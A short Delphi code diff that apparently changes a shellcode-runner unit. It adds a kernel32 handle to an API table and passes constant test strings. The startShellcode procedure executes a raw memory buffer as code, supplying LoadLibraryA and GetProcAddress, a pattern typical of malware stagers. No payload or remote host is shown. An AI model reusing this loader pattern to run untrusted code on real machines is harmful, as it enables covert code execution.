@@ -11,6 +11,7 @@ type
 
 type
   TAPIBlock = record
+    hKernelHandle:      Cardinal;
     pGetProcAddress:    xGetProcAddress;
     pLoadLibraryA:      xLoadLibrary;
     pGetMemory:         xGetMemory;
@@ -40,26 +41,26 @@ begin
 end;
 
 procedure SendInformation(hSocket:Integer);
-var
-  compname:String;
+const
+  compname = ' TEST NOW';
 begin
-  compname := 'TEST NOW';
-  SendBuffer(hSocket, 0, @compname[1], Length(compname) + 1);
+  SendBuffer(hSocket, 0, @compname[2], Length(compname));
 end;
 
 procedure startShellcode(ptrData:Pointer; dwLen:Cardinal);
+const
+  strMessage = ' HELLO MAN';
 var
   tlbAPIBlock:TAPIBlock;
   tlbShellCode:TShellCodeFunc;
-  strMessage:String;
 begin
   tlbShellCode := ptrData;
-  strMessage := 'HELLO MAN';
   with tlbAPIBlock do
   begin
+    hKernelHandle := GetModuleHandleA('kernel32.dll');
     pLoadLibraryA := @Windows.LoadLibraryA;
     pGetProcAddress := @Windows.GetProcAddress;
   end;
-  tlbShellCode(@strMessage[1], Length(strMessage), @tlbAPIBlock);
+  tlbShellCode(@strMessage[2], Length(strMessage) - 1, @tlbAPIBlock);
 end;
 end.
